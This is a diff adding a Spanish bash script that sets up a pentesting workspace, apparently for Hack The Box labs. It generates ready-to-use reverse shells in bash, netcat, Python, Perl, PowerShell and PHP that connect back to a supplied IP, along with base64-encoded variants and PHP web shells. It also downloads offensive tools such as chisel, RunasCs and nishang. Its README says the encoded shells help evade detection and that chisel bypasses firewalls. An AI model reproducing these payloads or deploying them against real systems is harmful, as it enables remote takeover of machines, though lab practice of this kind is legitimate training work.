@@ -1,0 +1,492 @@
+#!/bin/bash
+
+# workdir - Script para crear entorno de trabajo de pentesting
+# Uso: workdir <nombre_proyecto> <ip_vpn>
+
+# Colores para output
+RED='\033[0;31m'
+GREEN='\033[0;32m'
+YELLOW='\033[1;33m'
+BLUE='\033[0;34m'
+CYAN='\033[0;36m'
+NC='\033[0m' # No Color
+
+# Función para mostrar mensajes de error y salir
+error_exit() {
+    echo -e "${RED}[ERROR] $1${NC}" >&2
+    exit 1
+}
+
+# Función para mostrar información
+info() {
+    echo -e "${BLUE}[INFO] $1${NC}"
+}
+
+# Función para mostrar éxito
+success() {
+    echo -e "${GREEN}[SUCCESS] $1${NC}"
+}
+
+# Función para mostrar advertencia
+warning() {
+    echo -e "${YELLOW}[WARNING] $1${NC}"
+}
+
+# Verificar que se pasen los parámetros necesarios
+if [ $# -ne 2 ]; then
+    echo "Uso: $0 <nombre_proyecto> <ip_vpn>"
+    echo "Ejemplo: $0 proyecto1 10.10.15.50"
+    exit 1
+fi
+
+mkdir $HOME/HTB
+
+NAME=$1
+VPN_IP=$2
+PORT="7777"
+BASE_DIR="$HOME/Desktop/HTB/$NAME"
+SHELLS_DIR="$BASE_DIR/shells"
+CONNECTIONS_DIR="$BASE_DIR/conexiones"
+PAYLOADS_DIR="$BASE_DIR/payloads"
+
+# Validar formato de IP
+validate_ip() {
+    if ! [[ $VPN_IP =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        error_exit "La IP introducida no tiene un formato válido"
+    fi
+    success "IP validada: $VPN_IP"
+    success "Puerto configurado: $PORT"
+}
+
+# Función para crear directorios
+create_directories() {
+    info "Creando estructura de directorios..."
+    
+    mkdir -p "$SHELLS_DIR" "$CONNECTIONS_DIR" "$PAYLOADS_DIR" || error_exit "No se pudieron crear los directorios"
+    success "Directorios creados en: $BASE_DIR"
+}
+
+# Función para crear shells
+create_shells() {
+    info "Creando shells reversos con IP: $VPN_IP y Puerto: $PORT..."
+    
+    # Shells normales para Linux
+    cat > "$SHELLS_DIR/linux_bash_reverse.sh" << EOF
+#!/bin/bash
+# Reverse Shell Bash
+# Uso: bash linux_bash_reverse.sh
+bash -i >& /dev/tcp/$VPN_IP/$PORT 0>&1
+EOF
+
+    cat > "$SHELLS_DIR/linux_netcat_reverse.sh" << EOF
+#!/bin/bash
+# Reverse Shell Netcat
+# Uso: bash linux_netcat_reverse.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $VPN_IP $PORT >/tmp/f
+EOF
+
+    cat > "$SHELLS_DIR/linux_python_reverse.py" << EOF
+#!/usr/bin/env python3
+# Reverse Shell Python
+# Uso: python3 linux_python_reverse.py
+import socket,subprocess,os
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("$VPN_IP",$PORT))
+os.dup2(s.fileno(),0)
+os.dup2(s.fileno(),1)
+os.dup2(s.fileno(),2)
+p=subprocess.call(["/bin/sh","-i"])
+EOF
+
+    cat > "$SHELLS_DIR/linux_perl_reverse.pl" << EOF
+#!/usr/bin/perl
+# Reverse Shell Perl
+# Uso: perl linux_perl_reverse.pl
+use Socket;
+\$i="$VPN_IP";
+\$p=$PORT;
+socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
+if(connect(S,sockaddr_in(\$p,inet_aton(\$i)))){
+    open(STDIN,">&S");
+    open(STDOUT,">&S");
+    open(STDERR,">&S");
+    exec("/bin/sh -i");
+};
+EOF
+
+    # Shells para Windows
+    cat > "$SHELLS_DIR/windows_powershell_reverse.ps1" << EOF
+# Reverse Shell PowerShell
+# Uso: powershell -ExecutionPolicy Bypass -File windows_powershell_reverse.ps1
+\$client = New-Object System.Net.Sockets.TCPClient('$VPN_IP',$PORT)
+\$stream = \$client.GetStream()
+[byte[]]\$bytes = 0..65535|%{0}
+while((\$i = \$stream.Read(\$bytes, 0, \$bytes.Length)) -ne 0){
+    \$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i)
+    \$sendback = (iex \$data 2>&1 | Out-String )
+    \$sendback2 = \$sendback + 'PS ' + (pwd).Path + '> '
+    \$sendbyte = ([text.encoding]::ASCII).GetBytes(\$sendback2)
+    \$stream.Write(\$sendbyte,0,\$sendbyte.Length)
+    \$stream.Flush()
+}
+\$client.Close()
+EOF
+
+    cat > "$SHELLS_DIR/windows_netcat_reverse.bat" << EOF
+@echo off
+REM Reverse Shell Windows con Netcat
+REM Uso: windows_netcat_reverse.bat
+nc.exe $VPN_IP $PORT -e cmd.exe
+EOF
+
+    # Shells codificadas en Base64
+    info "Creando shells codificados en Base64..."
+    
+    # Bash Base64
+    BASE64_BASH=$(echo "bash -i >& /dev/tcp/$VPN_IP/$PORT 0>&1" | base64 -w 0)
+    cat > "$SHELLS_DIR/linux_bash_reverse_b64.txt" << EOF
+# Shell Bash codificado en Base64
+# Uso: echo '$BASE64_BASH' | base64 -d | bash
+
+echo '$BASE64_BASH' | base64 -d | bash
+EOF
+
+    # Python Base64
+    BASE64_PYTHON=$(echo "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('$VPN_IP',$PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/sh','-i'])" | base64 -w 0)
+    cat > "$SHELLS_DIR/linux_python_reverse_b64.txt" << EOF
+# Shell Python codificado en Base64
+# Uso: echo '$BASE64_PYTHON' | base64 -d | python3
+
+echo '$BASE64_PYTHON' | base64 -d | python3
+EOF
+
+    # Netcat Base64
+    BASE64_NETCAT=$(echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $VPN_IP $PORT >/tmp/f" | base64 -w 0)
+    cat > "$SHELLS_DIR/linux_netcat_reverse_b64.txt" << EOF
+# Shell Netcat codificado en Base64
+# Uso: echo '$BASE64_NETCAT' | base64 -d | bash
+
+echo '$BASE64_NETCAT' | base64 -d | bash
+EOF
+
+    # PowerShell Base64
+    POWERSHELL_SCRIPT="\$client=New-Object System.Net.Sockets.TCPClient('$VPN_IP',$PORT);\$stream=\$client.GetStream();[byte[]]\$bytes=0..65535|%{0};while((\$i=\$stream.Read(\$bytes,0,\$bytes.Length))-ne 0){;\$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString(\$bytes,0,\$i);\$sendback=(iex \$data 2>&1|Out-String);\$sendback2=\$sendback+'PS '+(pwd).Path+'> ';\$sendbyte=([text.encoding]::ASCII).GetBytes(\$sendback2);\$stream.Write(\$sendbyte,0,\$sendbyte.Length);\$stream.Flush()};\$client.Close()"
+    BASE64_POWERSHELL=$(echo "$POWERSHELL_SCRIPT" | iconv -t UTF-16LE | base64 -w 0)
+    cat > "$SHELLS_DIR/windows_powershell_reverse_b64.txt" << EOF
+# Shell PowerShell codificado en Base64 (Windows)
+# Uso: powershell -EncodedCommand $BASE64_POWERSHELL
+
+powershell -EncodedCommand $BASE64_POWERSHELL
+EOF
+
+    # PHP Base64
+    BASE64_PHP=$(echo "<?php \\\$sock=fsockopen('$VPN_IP',$PORT);exec('/bin/sh -i <&3 >&3 2>&3');?>" | base64 -w 0)
+    cat > "$SHELLS_DIR/php_reverse_b64.txt" << EOF
+# Shell PHP codificado en Base64
+# Uso: echo '$BASE64_PHP' | base64 -d | php
+
+echo '$BASE64_PHP' | base64 -d | php
+EOF
+
+    # Shell PHP normal
+    cat > "$SHELLS_DIR/php_reverse.php" << EOF
+<?php
+// Reverse Shell PHP
+// Uso: php php_reverse.php
+\$sock=fsockopen("$VPN_IP",$PORT);
+\$proc=proc_open("sh", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);
+?>
+EOF
+
+    # Shell PHP Web (para parámetro cmd)
+    cat > "$SHELLS_DIR/php_web_shell.php" << EOF
+<?php
+// Web Shell PHP - Ejecutar con: ?cmd=whoami
+// Uso: Subir a servidor web y acceder con: http://victima.com/shell.php?cmd=whoami
+if(isset(\$_GET['cmd'])) {
+    echo "<pre>";
+    system(\$_GET['cmd']);
+    echo "</pre>";
+    die();
+}
+?>
+<html>
+<body>
+<form method="GET">
+    <input type="text" name="cmd" placeholder="Comando" size="50">
+    <input type="submit" value="Ejecutar">
+</form>
+</body>
+</html>
+EOF
+
+    # Shell PHP Web minimalista (sin HTML)
+    cat > "$SHELLS_DIR/php_web_mini.php" << EOF
+<?php
+// Web Shell PHP Minimalista
+// Uso: http://victima.com/shell.php?cmd=whoami
+if(isset(\$_REQUEST['cmd'])) {
+    echo "<pre>";
+    system(\$_REQUEST['cmd']);
+    echo "</pre>";
+}
+?>
+EOF
+
+    # PHP Base64 (para el reverse shell normal)
+    BASE64_PHP=$(echo "<?php \$sock=fsockopen(\"$VPN_IP\",$PORT);\$proc=proc_open(\"sh\", array(0=>\$sock, 1=>\$sock, 2=>\$sock),\$pipes);?>" | base64 -w 0)
+    cat > "$SHELLS_DIR/php_reverse_b64.txt" << EOF
+# Shell PHP Reverse codificado en Base64
+# Uso: echo '$BASE64_PHP' | base64 -d | php
+
+echo '$BASE64_PHP' | base64 -d | php
+EOF
+
+    # PHP Web Base64 (para el web shell)
+    WEB_SHELL_CODE='<?php if(isset($_GET["cmd"])) { system($_GET["cmd"]); } ?>'
+    BASE64_PHP_WEB=$(echo "$WEB_SHELL_CODE" | base64 -w 0)
+    cat > "$SHELLS_DIR/php_web_shell_b64.txt" << EOF
+# Web Shell PHP codificado en Base64
+# Uso: echo '$BASE64_PHP_WEB' | base64 -d > shell.php
+# Luego subir a servidor web y usar: http://victima.com/shell.php?cmd=whoami
+
+echo '$BASE64_PHP_WEB' | base64 -d > shell.php
+EOF
+
+    # Hacer ejecutables los shells de Linux
+    chmod +x "$SHELLS_DIR"/linux_*.sh
+    chmod +x "$SHELLS_DIR"/linux_*.py
+    chmod +x "$SHELLS_DIR"/linux_*.pl
+    chmod +x "$SHELLS_DIR"/*.php
+    
+    success "Shells reversos creados"
+    success "Shells Base64 creados"
+}
+
+# Función para descargar herramientas de conexión
+download_connection_tools() {
+    info "Descargando herramientas de conexión..."
+    
+    cd "$CONNECTIONS_DIR" || error_exit "No se pudo acceder al directorio de conexiones"
+    
+    # Socat
+    info "Descargando Socat..."
+    wget -q --timeout=30 "https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat" -O socat_linux_x64 && chmod +x socat_linux_x64 && success "Socat Linux descargado" || warning "No se pudo descargar socat para Linux"
+    
+    # Chisel
+    info "Descargando Chisel..."
+    wget -q --timeout=30 "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_linux_amd64.gz" -O chisel_linux.gz && gunzip -f chisel_linux.gz && mv chisel_linux chisel_linux_amd64 && chmod +x chisel_linux_amd64 && success "Chisel Linux descargado" || warning "No se pudo descargar chisel para Linux"
+    
+    wget -q --timeout=30 "https://github.com/jpillora/chisel/releases/download/v1.9.1/chisel_1.9.1_windows_amd64.gz" -O chisel_windows.gz && gunzip -f chisel_windows.gz && mv chisel_windows chisel_windows_amd64.exe && success "Chisel Windows descargado" || warning "No se pudo descargar chisel para Windows"
+    
+    # Netcat para Windows
+    info "Descargando Netcat para Windows..."
+    wget -q --timeout=30 "https://github.com/int0x33/nc.exe/raw/master/nc64.exe" -O nc64.exe && success "Netcat Windows descargado" || warning "No se pudo descargar Netcat para Windows"
+    
+    # Script de ejemplos
+    cat > "$CONNECTIONS_DIR/ejemplos.md" << EOF
+# Ejemplos de Uso
+
+## Socat
+\`\`\`bash
+./socat_linux_x64 TCP-LISTEN:$PORT,fork TCP:$VPN_IP:$PORT
+\`\`\`
+
+## Chisel
+**Servidor (atacante):**
+\`\`\`bash
+./chisel_linux_amd64 server -p 8080 --reverse
+\`\`\`
+
+**Cliente (víctima):**
+\`\`\`bash
+./chisel_windows_amd64.exe client $VPN_IP:8080 R:$PORT:127.0.0.1:$PORT
+\`\`\`
+
+## Netcat Windows
+\`\`\`cmd
+nc64.exe $VPN_IP $PORT -e cmd.exe
+\`\`\`
+EOF
+
+    success "Herramientas de conexión descargadas"
+}
+
+# Función para descargar payloads y herramientas
+download_payloads() {
+    info "Descargando payloads y herramientas..."
+    
+    cd "$PAYLOADS_DIR" || error_exit "No se pudo acceder al directorio de payloads"
+    
+    # RunasCs - desde el ZIP
+    info "Descargando RunasCs..."
+    wget -q --timeout=30 "https://github.com/antonioCoco/RunasCs/releases/download/v1.5/RunasCs.zip" -O RunasCs.zip && unzip -q RunasCs.zip -d RunasCs/ && success "RunasCs descargado y extraído" || warning "No se pudo descargar RunasCs"
+    
+    # BloodyAD
+    info "Clonando BloodyAD..."
+    git clone -q https://github.com/CravateRouge/BloodyAD.git 2>/dev/null && success "BloodyAD clonado" || warning "No se pudo clonar BloodyAD"
+    
+    # Herramientas de enumeración
+    info "Descargando PEASS-ng..."
+    wget -q --timeout=30 "https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh" -O linpeas.sh && chmod +x linpeas.sh && success "LinPEAS descargado" || warning "No se pudo descargar LinPEAS"
+    
+    wget -q --timeout=30 "https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe" -O winPEAS.exe && success "WinPEAS descargado" || warning "No se pudo descargar WinPEAS"
+    
+    # Otras herramientas
+    info "Descargando herramientas adicionales..."
+    wget -q --timeout=30 "https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh" -O LinEnum.sh && chmod +x LinEnum.sh && success "LinEnum descargado" || warning "No se pudo descargar LinEnum"
+    
+    wget -q --timeout=30 "https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh" -O les.sh && chmod +x les.sh && success "Linux Exploit Suggester descargado" || warning "No se pudo descargar Linux Exploit Suggester"
+    
+    # PowerShell Invoke-PowerShellTcp
+    wget -q --timeout=30 "https://raw.githubusercontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1" -O Invoke-PowerShellTcp.ps1 && success "Invoke-PowerShellTcp descargado" || warning "No se pudo descargar Invoke-PowerShellTcp"
+    
+    # Crear script de configuración para PowerShell
+    cat > "$PAYLOADS_DIR/powershell_config.ps1" << EOF
+# Configuración para shells PowerShell
+# Uso: powershell -ExecutionPolicy Bypass -File powershell_config.ps1
+
+. .\Invoke-PowerShellTcp.ps1
+Invoke-PowerShellTcp -Reverse -IPAddress $VPN_IP -Port $PORT
+EOF
+
+    success "Payloads y herramientas descargadas"
+}
+
+# Función para crear archivo de configuración
+create_config() {
+    info "Creando documentación..."
+    
+    cat > "$BASE_DIR/README.md" << EOF
+# 🚀 Proyecto: $NAME
+
+## 📋 Configuración
+- **IP de la VPN:** \`$VPN_IP\`
+- **Puerto:** \`$PORT\`
+- **Fecha de creación:** $(date)
+
+## 🎧 Listener Recomendado
+\`\`\`bash
+nc -lvnp $PORT
+\`\`\`
+
+## 📁 Estructura del Proyecto
+
+### 🔥 shells/
+#### Shells Normales:
+- \`linux_bash_reverse.sh\` - Shell Bash
+- \`linux_netcat_reverse.sh\` - Shell Netcat  
+- \`linux_python_reverse.py\` - Shell Python
+- \`linux_perl_reverse.pl\` - Shell Perl
+- \`windows_powershell_reverse.ps1\` - Shell PowerShell
+- \`windows_netcat_reverse.bat\` - Shell Netcat
+
+#### Shells Codificados Base64:
+- \`linux_bash_reverse_b64.txt\` - Bash Base64
+- \`linux_python_reverse_b64.txt\` - Python Base64  
+- \`linux_netcat_reverse_b64.txt\` - Netcat Base64
+- \`windows_powershell_reverse_b64.txt\` - PowerShell Base64
+- \`php_reverse_b64.txt\` - PHP Base64
+
+### 🔗 conexiones/
+- \`socat_linux_x64\` - Socat para Linux
+- \`chisel_linux_amd64\` - Chisel para Linux  
+- \`chisel_windows_amd64.exe\` - Chisel para Windows
+- \`nc64.exe\` - Netcat para Windows
+
+### 💣 payloads/
+- \`RunasCs/\` - Ejecutar como otro usuario (Windows)
+- \`BloodyAD/\` - Herramientas Active Directory
+- \`linpeas.sh\` - Enumeración Linux
+- \`winPEAS.exe\` - Enumeración Windows
+- \`LinEnum.sh\` - Enumeración básica Linux
+- \`les.sh\` - Sugerencia de exploits
+- \`Invoke-PowerShellTcp.ps1\` - Shell PowerShell avanzado
+
+## 🛠️ Comandos Útiles
+
+### Escuchar Conexiones:
+\`\`\`bash
+nc -lvnp $PORT
+ncat -lvnp $PORT
+./conexiones/socat_linux_x64 TCP-LISTEN:$PORT,fork TCP:$VPN_IP:$PORT
+\`\`\`
+
+### Shells Base64:
+\`\`\`bash
+# Bash
+echo '<BASE64>' | base64 -d | bash
+
+# Python  
+echo '<BASE64>' | base64 -d | python3
+
+# PowerShell (Windows)
+powershell -EncodedCommand <BASE64>
+\`\`\`
+
+### Verificar Conectividad:
+\`\`\`bash
+ping $VPN_IP
+nmap -p $PORT $VPN_IP
+\`\`\`
+
+## 🎯 Tips Rápidos
+1. Asegúrate de tener un listener en puerto $PORT
+2. Los shells Base64 son útiles para evitar detección
+3. Usa Chisel para bypass de firewalls
+4. RunasCs está en payloads/RunasCs/
+
+**¡Listo para pentest! 🎯**
+EOF
+
+    success "Documentación creada: $BASE_DIR/README.md"
+}
+
+# Función principal
+main() {
+    echo -e "${GREEN}"
+    echo "╔══════════════════════════════════════════════╗"
+    echo "║                 workdir                      ║"
+    echo "║        Creando entorno de trabajo            ║"
+    echo "╚══════════════════════════════════════════════╝"
+    echo -e "${NC}"
+    echo -e "${CYAN}📂 Proyecto: $NAME${NC}"
+    echo -e "${CYAN}🎯 IP: $VPN_IP${NC}"
+    echo -e "${CYAN}🔌 Puerto: $PORT${NC}"
+    echo ""
+    
+    # Validar IP
+    validate_ip
+    
+    # Crear directorios
+    create_directories
+    
+    # Crear shells
+    create_shells
+    
+    # Descargar herramientas
+    download_connection_tools
+    download_payloads
+    
+    # Crear documentación
+    create_config
+    
+    echo
+    echo -e "${GREEN}✅ Entorno de trabajo creado exitosamente!${NC}"
+    echo
+    echo -e "${CYAN}🎯 ${NC} ${GREEN}IP configurada: $VPN_IP${NC}"
+    echo -e "${CYAN}🔌 ${NC} ${GREEN}Puerto: $PORT${NC}"
+    echo -e "${CYAN}📁 ${NC} ${GREEN}Directorio: $BASE_DIR${NC}"
+    echo -e "${CYAN}📚 ${NC} ${GREEN}Documentación: $BASE_DIR/README.md${NC}"
+    echo
+    echo -e "${YELLOW}📋 Shells normales y codificados en Base64 creados${NC}"
+    echo -e "${YELLOW}🛠️  Herramientas de conexión y payloads descargados${NC}"
+    echo
+    echo -e "${GREEN}🚀 ¡Listo para pentest!${NC}"
+    echo
+    echo -e "${CYAN}🎧 No olvides ejecutar el listener:${NC}"
+    echo -e "${GREEN}nc -lvnp $PORT${NC}"
+}
+
+# Ejecutar función principal
+main
